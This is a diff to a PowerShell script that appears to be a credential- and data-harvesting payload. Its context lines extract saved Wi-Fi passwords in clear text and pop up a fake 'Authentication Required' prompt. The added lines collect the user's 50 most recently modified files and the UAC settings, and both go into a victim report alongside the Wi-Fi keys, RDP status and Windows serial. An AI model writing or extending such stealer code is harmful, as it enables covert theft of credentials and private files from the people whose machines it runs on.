@@ -28,13 +28,19 @@ $wifiProfiles_EN = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$nam
 $wifiProfiles_IT = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Contenuto Chiave\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ssid=$name;pass=$pass }} | Format-Table -AutoSize | Out-String
 
 
-# ----------------- CHECK RDP STATUS
 
+# ----------------- CHECK RDP STATUS
 if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
 	$RDP = "Enabled" 
 } else {
 	$RDP = "Disabled" 
 }
+
+
+
+# ----------------- GET RECENT FILES LIST !
+$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 50 FullName, LastWriteTime
+
 
 
 # ----------------- CAPS OFF !
@@ -54,6 +60,20 @@ $msgTitle = "Authentication Required"
 $msgButton = 'Ok'
 $msgImage = 'Warning'
 $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
+
+
+# ----------------- GET UAC STATUS !
+Function Get-RegistryValue($key, $value) {  (Get-ItemProperty $key $value).$value }
+$Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" 
+$ConsentPromptBehaviorAdmin_Name = "ConsentPromptBehaviorAdmin" 
+$PromptOnSecureDesktop_Name = "PromptOnSecureDesktop" 
+$ConsentPromptBehaviorAdmin_Value = Get-RegistryValue $Key $ConsentPromptBehaviorAdmin_Name 
+$PromptOnSecureDesktop_Value = Get-RegistryValue $Key $PromptOnSecureDesktop_Name
+If($ConsentPromptBehaviorAdmin_Value -Eq 0 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Never notIfy" }
+ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "NotIfy me only when apps try to make changes to my computer(do not dim my desktop)" } 
+ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "NotIfy me only when apps try to make changes to my computer(default)" }
+ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 2 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Always notIfy" }
+Else{ $UAC = "Unknown" } 
 
 
 
@@ -108,6 +128,14 @@ Wi-Fi Profiles and Passwords:
 Remote Desktop Status
 ----------------------------------- 
 RDP: " + $RDP + "
+  
+UAC Status
+----------------------------------- 
+UAC: " + $UAC + "
+
+Recent File List
+-----------------------------------
+" + $RecentFiles + "
 
 Windows Serial
 ----------------------------------- 
